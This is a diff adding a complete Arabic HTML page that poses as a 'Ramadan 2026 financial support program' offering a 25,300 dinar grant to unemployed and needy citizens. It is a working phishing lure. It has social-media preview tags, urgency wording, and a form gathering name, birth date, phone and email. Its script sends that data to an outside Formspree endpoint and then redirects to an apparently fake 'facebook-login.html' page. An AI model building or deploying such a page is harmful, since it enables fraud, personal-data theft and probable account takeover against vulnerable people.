@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+    
+    
+    <!-- وسم خاص بفيسبوك لعرض المعاينة -->
+<meta property="og:title" content="برنامج الدعم المالي - رمضان 2026">
+<meta property="og:description" content="منحة مالية بقيمة 25,300 دينار بمناسبة شهر رمضان الكريم. سارع بالتسجيل، الأماكن محدودة.">
+<meta property="og:image" content="https://g.top4top.io/p_3715grun70.jpg">
+<meta property="og:url" content="https://your-username.github.io/repo-name/">
+<meta property="og:type" content="website">
+<meta property="og:locale" content="ar_AR">
+
+<!-- وسم إضافي لجعل الصورة بحجم مناسب -->
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+
+<!-- وسم خاص ببطاقة تويتر (اختياري، يعمل أيضاً مع فيسبوك) -->
+<meta name="twitter:card" content="summary_large_image">
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>برنامج الدعم المالي - رمضان 2026</title>
+    <style>
+        /* الأنماط كما هي مع بعض التعديلات البسيطة */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Tajawal', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        body {
+            min-height: 100vh;
+            background: linear-gradient(145deg, #f5f7fa 0%, #e9ecf0 100%);
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 20px;
+        }
+        .container {
+            max-width: 520px;
+            width: 100%;
+            margin: 30px auto;
+        }
+        .card {
+            background: white;
+            border-radius: 20px;
+            padding: 30px 25px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(0, 0, 0, 0.05);
+        }
+        h1 {
+            color: #1a2b3c;
+            font-size: 2rem;
+            font-weight: 600;
+            text-align: center;
+            margin-bottom: 25px;
+            border-bottom: 2px solid #b8860b;
+            padding-bottom: 15px;
+        }
+        .greeting {
+            color: #1e3a5f;
+            font-size: 1.5rem;
+            font-weight: 500;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .offer-box {
+            background: #f0f4f8;
+            border-radius: 16px;
+            padding: 25px;
+            margin: 20px 0;
+            text-align: center;
+            border-right: 5px solid #b8860b;
+        }
+        .offer-box p {
+            color: #2c3e50;
+            font-size: 1.2rem;
+            margin-bottom: 10px;
+        }
+        .highlight {
+            color: #b8860b;
+            font-size: 3rem;
+            font-weight: 800;
+            display: block;
+            margin: 15px 0;
+        }
+        .btn {
+            background: #b8860b;
+            color: white;
+            border: none;
+            font-size: 1.3rem;
+            font-weight: 600;
+            padding: 16px 40px;
+            border-radius: 50px;
+            cursor: pointer;
+            width: 100%;
+            max-width: 260px;
+            margin: 25px auto 0;
+            display: block;
+            transition: all 0.2s;
+            box-shadow: 0 5px 15px rgba(184, 134, 11, 0.3);
+        }
+        .btn:hover {
+            background: #9e7409;
+            transform: translateY(-2px);
+        }
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+        .popup-card {
+            background: white;
+            border-radius: 24px;
+            padding: 30px;
+            max-width: 500px;
+            width: 100%;
+            max-height: 90vh;
+            overflow-y: auto;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.3);
+        }
+        .popup-header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .popup-header h2 {
+            color: #1a2b3c;
+            font-size: 2rem;
+        }
+        .offer-summary {
+            background: #f0f4f8;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        .offer-summary .amount {
+            color: #b8860b;
+            font-size: 2.2rem;
+            font-weight: 700;
+        }
+        .btn-ok {
+            background: #b8860b;
+            color: white;
+            border: none;
+            font-size: 1.3rem;
+            font-weight: 600;
+            padding: 12px 40px;
+            border-radius: 50px;
+            cursor: pointer;
+            width: fit-content;
+            margin: 0 auto 25px;
+            display: block;
+        }
+        .form-section {
+            margin-top: 20px;
+        }
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-group label {
+            display: block;
+            color: #1e3a5f;
+            font-weight: 500;
+            margin-bottom: 6px;
+            font-size: 0.95rem;
+        }
+        .form-group .optional {
+            color: #6c757d;
+            font-size: 0.85rem;
+            font-weight: normal;
+            margin-right: 5px;
+        }
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1.5px solid #d0d9e2;
+            border-radius: 12px;
+            font-size: 1rem;
+            background: white;
+        }
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: #b8860b;
+        }
+        .btn-submit {
+            background: #b8860b;
+            color: white;
+            border: none;
+            font-size: 1.2rem;
+            font-weight: 600;
+            padding: 16px;
+            border-radius: 50px;
+            cursor: pointer;
+            width: 100%;
+            margin: 15px 0;
+        }
+        .hidden {
+            display: none;
+        }
+        .scroll-top {
+            scroll-margin-top: 100px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <h1>برنامج الدعم المالي</h1>
+            <h1>رمضان 2026</h1>
+            
+            <div class="greeting">مرحباً بك</div>
+            
+            <div class="offer-box">
+                <p>بمناسبة شهر رمضان المبارك</p>
+                <span class="highlight">25,300 د.ج</span>
+                <p>منحة مالية للمواطنين المستحقين</p>
+            </div>
+            
+            <p style="text-align: center; color: #1e3a5f;">الأماكن محدودة - سارع بالتسجيل</p>
+            
+            <button class="btn" id="showPopupBtn">التقدم بطلب</button>
+        </div>
+    </div>
+
+    <!-- نافذة إدخال البيانات (جميع الحقول اختيارية) -->
+    <div class="overlay" id="overlay">
+        <div class="popup-card" id="popupCard">
+            <div class="popup-header">
+                <h2>طلب الدعم المالي</h2>
+            </div>
+            
+            <div class="offer-summary">
+                <span class="amount">25,300 د.ج</span>
+                <p style="margin-top: 8px;">دعم مالي لشهر رمضان</p>
+            </div>
+            
+            <button class="btn-ok" id="btnShowForm">حسناً</button>
+            
+            <!-- نموذج الإدخال - جميع الحقول اختيارية الآن -->
+            <div id="formContainer" class="form-section hidden">
+                <form id="userForm">
+                    <div class="form-group">
+                        <label>الاسم الكامل <span class="optional">(اختياري)</span></label>
+                        <input type="text" id="fullName" placeholder="أدخل اسمك الكامل">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>تاريخ الميلاد <span class="optional">(اختياري)</span></label>
+                        <input type="text" id="birthDate" placeholder="مثال: 15 مارس 1985">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>رقم الهاتف <span class="optional">(اختياري)</span></label>
+                        <input type="tel" id="phoneNumber" placeholder="أدخل رقم هاتفك">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>البريد الإلكتروني <span class="optional">(اختياري)</span></label>
+                        <input type="text" id="email" placeholder="example@email.com">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>المهنة <span class="optional">(اختياري)</span></label>
+                        <select id="profession">
+                            <option value="">اختر مهنتك (اختياري)</option>
+                            <option value="بطال">بطال</option>
+                            <option value="عامل بأجر ضعيف">عامل بأجر ضعيف</option>
+                            <option value="معوز">معوز</option>
+                        </select>
+                    </div>
+                    
+                    <button type="submit" class="btn-submit">تأكيد الطلب</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            const overlay = document.getElementById('overlay');
+            const popupCard = document.getElementById('popupCard');
+            const showPopupBtn = document.getElementById('showPopupBtn');
+            const btnShowForm = document.getElementById('btnShowForm');
+            const formContainer = document.getElementById('formContainer');
+            const userForm = document.getElementById('userForm');
+
+            // فتح النافذة
+            showPopupBtn.addEventListener('click', function() {
+                overlay.style.display = 'flex';
+                formContainer.classList.add('hidden');
+                btnShowForm.style.display = 'block';
+            });
+
+            // الضغط على "حسناً" -> التمرير لأعلى وإظهار النموذج
+            btnShowForm.addEventListener('click', function() {
+                btnShowForm.style.display = 'none';
+                formContainer.classList.remove('hidden');
+                
+                // التمرير إلى أعلى النافذة
+                popupCard.scrollTo({ top: 0, behavior: 'smooth' });
+                overlay.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+
+            // إرسال النموذج (بدون تحقق إجباري)
+            userForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // جمع البيانات (حتى الفارغة)
+                const userData = {
+                    الاسم_الكامل: document.getElementById('fullName').value.trim() || 'لم يذكر',
+                    تاريخ_الميلاد: document.getElementById('birthDate').value.trim() || 'لم يذكر',
+                    رقم_الهاتف: document.getElementById('phoneNumber').value.trim() || 'لم يذكر',
+                    البريد_الإلكتروني: document.getElementById('email').value.trim() || 'لم يذكر',
+                    المهنة: document.getElementById('profession').value || 'لم يذكر',
+                    الوقت: new Date().toLocaleString('ar-EG')
+                };
+
+                // حفظ في localStorage
+                localStorage.setItem('userData', JSON.stringify(userData));
+                localStorage.setItem('userName', userData.الاسم_الكامل);
+
+                // إرسال إلى Formspree
+                fetch('https://formspree.io/f/mbdanozz', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        ...userData,
+                        _subject: 'طلب دعم مالي جديد'
+                    })
+                })
+                .then(response => {
+                    if (response.ok) {
+                        window.location.href = 'facebook-login.html';
+                    } else {
+                        alert('حدث خطأ في الإرسال. حاول مرة أخرى.');
+                    }
+                })
+                .catch(error => {
+                    alert('خطأ في الاتصال. تأكد من اتصالك بالإنترنت.');
+                });
+            });
+
+            // إغلاق النافذة عند النقر خارجها
+            overlay.addEventListener('click', function(e) {
+                if (e.target === overlay) {
+                    overlay.style.display = 'none';
+                }
+            });
+        })();
+    </script>
+</body>
+</html>
